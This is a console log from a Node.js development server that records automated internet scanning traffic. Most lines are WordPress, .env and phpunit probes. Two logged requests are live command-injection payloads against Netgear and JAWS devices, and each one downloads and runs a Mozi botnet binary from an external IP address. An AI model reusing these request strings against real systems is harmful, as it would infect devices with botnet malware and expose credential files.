
> packachange@1.0.0 server
> nodemon server.js --ignore frontend_react

[33m[nodemon] 2.0.15[39m
[33m[nodemon] to restart at any time, enter `rs`[39m
[33m[nodemon] watching path(s): *.*[39m
[33m[nodemon] watching extensions: js,mjs,json[39m
[32m[nodemon] starting `node server.js`[39m
Server is running on port 80
[0mGET /wp-includes/wlwmanifest.xml [32m200[0m 1.075 ms - 2460[0m
[0mGET /xmlrpc.php?rsd [32m200[0m 1.065 ms - 2460[0m
[0mGET / [32m200[0m 3.069 ms - 2460[0m
[0mGET /blog/wp-includes/wlwmanifest.xml [32m200[0m 1.114 ms - 2460[0m
[0mGET /web/wp-includes/wlwmanifest.xml [32m200[0m 1.119 ms - 2460[0m
[0mGET /wordpress/wp-includes/wlwmanifest.xml [32m200[0m 1.092 ms - 2460[0m
[0mGET /website/wp-includes/wlwmanifest.xml [32m200[0m 1.048 ms - 2460[0m
[0mGET /wp/wp-includes/wlwmanifest.xml [32m200[0m 0.913 ms - 2460[0m
[0mGET /news/wp-includes/wlwmanifest.xml [32m200[0m 1.079 ms - 2460[0m
[0mGET /wp1/wp-includes/wlwmanifest.xml [32m200[0m 0.960 ms - 2460[0m
[0mGET /test/wp-includes/wlwmanifest.xml [32m200[0m 0.960 ms - 2460[0m
[0mGET /wp2/wp-includes/wlwmanifest.xml [32m200[0m 1.271 ms - 2460[0m
[0mGET /site/wp-includes/wlwmanifest.xml [32m200[0m 1.025 ms - 2460[0m
[0mGET /cms/wp-includes/wlwmanifest.xml [32m200[0m 1.314 ms - 2460[0m
[0mGET /sito/wp-includes/wlwmanifest.xml [32m200[0m 1.195 ms - 2460[0m
[0mGET / [32m200[0m 0.961 ms - 2460[0m
[0mGET http://azenv.net/ [32m200[0m 1.115 ms - 2460[0m
[0mGET / [32m200[0m 0.911 ms - 2460[0m
[0mGET /favicon.ico [32m200[0m 1.149 ms - 3870[0m
[0mGET / [32m200[0m 0.748 ms - 2460[0m
[0mGET /config/getuser?index=0 [32m200[0m 0.870 ms - 2460[0m
[0mGET /.env [32m200[0m 0.870 ms - 2460[0m
[0mPOST / [33m404[0m 0.377 ms - 140[0m
[0mGET / [32m200[0m 2.690 ms - 2460[0m
[0mGET / [32m200[0m 0.624 ms - 2460[0m
[0mGET /.env [32m200[0m 0.874 ms - 2460[0m
[0mPOST / [33m404[0m 286.329 ms - 140[0m
[0mGET /config/getuser?index=0 [32m200[0m 0.751 ms - 2460[0m
[0mGET / [32m200[0m 0.839 ms - 2460[0m
[0mGET / [32m200[0m 0.574 ms - 2460[0m
[0mGET / [32m200[0m 1.071 ms - 2460[0m
[0mPOST / [33m404[0m 0.371 ms - 140[0m
[0mGET /.env [32m200[0m 0.904 ms - 2460[0m
[0mGET / [32m200[0m 0.730 ms - 2460[0m
[0mGET / [32m200[0m 0.757 ms - 2460[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://119.178.173.12:54165/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [32m200[0m 3.001 ms - 2460[0m
[0mGET / [32m200[0m 0.795 ms - 2460[0m
[0mGET / [32m200[0m 1.072 ms - 2460[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://221.200.200.75:33809/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [32m200[0m 1.039 ms - 2460[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 0.524 ms - 190[0m
